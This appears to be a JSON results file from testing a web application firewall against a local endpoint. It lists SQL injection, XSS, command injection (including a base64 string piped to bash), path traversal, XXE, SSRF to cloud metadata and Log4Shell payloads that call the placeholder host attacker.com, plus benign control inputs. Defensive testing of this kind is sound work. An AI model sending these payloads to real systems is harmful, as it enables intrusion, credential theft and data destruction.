@@ -1,0 +1,312 @@
+[
+  {
+    "category": "SQL Injection",
+    "name": "Basic",
+    "payload": "' OR '1'='1",
+    "http_request": "GET http://localhost:5000/api/products?search=%27+OR+%271%27%3D%271",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 20.0,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Blind Time-based",
+    "payload": "' AND (SELECT SLEEP(5))--",
+    "http_request": "GET http://localhost:5000/api/products?search=%27+AND+%28SELECT+SLEEP%285%29%29--",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 12.32,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Union",
+    "payload": "' UNION SELECT username, password FROM users--",
+    "http_request": "GET http://localhost:5000/api/products?search=%27+UNION+SELECT+username%2C+password+FROM+users--",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 16.74,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Boolean",
+    "payload": "' AND 1=1--",
+    "http_request": "GET http://localhost:5000/api/products?search=%27+AND+1%3D1--",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 14.01,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SQL Injection",
+    "name": "Stacked",
+    "payload": "'; DROP TABLE users--",
+    "http_request": "GET http://localhost:5000/api/products?search=%27%3B+DROP+TABLE+users--",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 13.0,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "XSS",
+    "name": "Basic",
+    "payload": "<script>alert(1)</script>",
+    "http_request": "GET http://localhost:5000/api/products?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 18.87,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "XSS",
+    "name": "DOM",
+    "payload": "\"><img src=x onerror=alert(document.cookie)>",
+    "http_request": "GET http://localhost:5000/api/products?search=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 14.3,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "XSS",
+    "name": "Obfuscated",
+    "payload": "<scr<script>ipt>alert(1)</script>",
+    "http_request": "GET http://localhost:5000/api/products?search=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscript%3E",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 13.62,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Command Injection",
+    "name": "Basic",
+    "payload": "; cat /etc/passwd",
+    "http_request": "GET http://localhost:5000/api/products?search=%3B+cat+%2Fetc%2Fpasswd",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 11.51,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Command Injection",
+    "name": "Pipe",
+    "payload": "| whoami",
+    "http_request": "GET http://localhost:5000/api/products?search=%7C+whoami",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 14.56,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Command Injection",
+    "name": "Base64 Exec",
+    "payload": "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash",
+    "http_request": "GET http://localhost:5000/api/products?search=echo+Y2F0IC9ldGMvcGFzc3dk+%7C+base64+-d+%7C+bash",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 14.0,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Path Traversal",
+    "name": "Basic",
+    "payload": "../../../etc/passwd",
+    "http_request": "GET http://localhost:5000/api/products?search=..%2F..%2F..%2Fetc%2Fpasswd",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 14.89,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Path Traversal",
+    "name": "Windows",
+    "payload": "..\\..\\..\\windows\\system32\\cmd.exe",
+    "http_request": "GET http://localhost:5000/api/products?search=..%5C..%5C..%5Cwindows%5Csystem32%5Ccmd.exe",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 17.78,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Path Traversal",
+    "name": "Directory Traversal",
+    "payload": "..%2f..%2f..%2fetc%2fpasswd",
+    "http_request": "GET http://localhost:5000/api/products?search=..%252f..%252f..%252fetc%252fpasswd",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 13.99,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "XXE",
+    "name": "Basic",
+    "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
+    "http_request": "GET http://localhost:5000/api/products?search=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 17.0,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SSRF",
+    "name": "Basic",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "http_request": "GET http://localhost:5000/api/products?search=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 17.1,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SSRF",
+    "name": "Localhost",
+    "payload": "http://127.0.0.1/admin",
+    "http_request": "GET http://localhost:5000/api/products?search=http%3A%2F%2F127.0.0.1%2Fadmin",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 15.36,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SSTI",
+    "name": "Jinja2",
+    "payload": "{{7*7}}",
+    "http_request": "GET http://localhost:5000/api/products?search=%7B%7B7%2A7%7D%7D",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 15.96,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "SSTI",
+    "name": "EL",
+    "payload": "${7*7}",
+    "http_request": "GET http://localhost:5000/api/products?search=%24%7B7%2A7%7D",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 17.0,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Log4Shell",
+    "name": "Basic",
+    "payload": "${jndi:ldap://attacker.com/a}",
+    "http_request": "GET http://localhost:5000/api/products?search=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 18.49,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Log4Shell",
+    "name": "Obfuscated",
+    "payload": "${${lower:j}ndi:ldap://attacker.com/a}",
+    "http_request": "GET http://localhost:5000/api/products?search=%24%7B%24%7Blower%3Aj%7Dndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 15.23,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "URL Encoded SQLi",
+    "payload": "%27%20OR%20%271%27%3D%271",
+    "http_request": "GET http://localhost:5000/api/products?search=%2527%2520OR%2520%25271%2527%253D%25271",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 17.0,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "Double URL Encoded SQLi",
+    "payload": "%2527%2520OR%2520%25271%2527%253D%25271",
+    "http_request": "GET http://localhost:5000/api/products?search=%252527%252520OR%252520%2525271%252527%25253D%2525271",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 34.9,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "Unicode SQLi",
+    "payload": "\\u0027 OR \\u00271\\u0027=\\u00271",
+    "http_request": "GET http://localhost:5000/api/products?search=%5Cu0027+OR+%5Cu00271%5Cu0027%3D%5Cu00271",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 20.23,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Payload Variations",
+    "name": "Mixed (SQLi + XSS)",
+    "payload": "' OR '1'='1; <script>alert(1)</script>",
+    "http_request": "GET http://localhost:5000/api/products?search=%27+OR+%271%27%3D%271%3B+%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 18.68,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "Login",
+    "payload": "user123",
+    "http_request": "GET http://localhost:5000/api/products?search=user123",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 14.75,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "Search",
+    "payload": "Apple iPhone 15 Pro Max",
+    "http_request": "GET http://localhost:5000/api/products?search=Apple+iPhone+15+Pro+Max",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 18.65,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "Filename",
+    "payload": "filename=report_2024.pdf",
+    "http_request": "GET http://localhost:5000/api/products?search=filename%3Dreport_2024.pdf",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 15.29,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "URL",
+    "payload": "https://google.com/search?q=test",
+    "http_request": "GET http://localhost:5000/api/products?search=https%3A%2F%2Fgoogle.com%2Fsearch%3Fq%3Dtest",
+    "status_code": 401,
+    "action": "Allowed",
+    "response_time_ms": 17.0,
+    "http_response": "{\"error\": \"Authentication required\"}"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "JSON",
+    "payload": "{\"username\":\"john\", \"role\":\"admin\", \"age\": 30}",
+    "http_request": "POST http://localhost:5000/api/data",
+    "status_code": 201,
+    "action": "Allowed",
+    "response_time_ms": 14.0,
+    "http_response": "{\"id\": 1782925466, \"message\": \"Data accepted\", \"processed_at\": 1782925466.751133}"
+  },
+  {
+    "category": "Legitimate (False Positives)",
+    "name": "XML",
+    "payload": "<user><name>john</name><role>admin</role></user>",
+    "http_request": "POST http://localhost:5000/api/data",
+    "status_code": 201,
+    "action": "Allowed",
+    "response_time_ms": 14.54,
+    "http_response": "{\"id\": 1782925466, \"message\": \"Data accepted\", \"processed_at\": 1782925466.8770885}"
+  }
+]
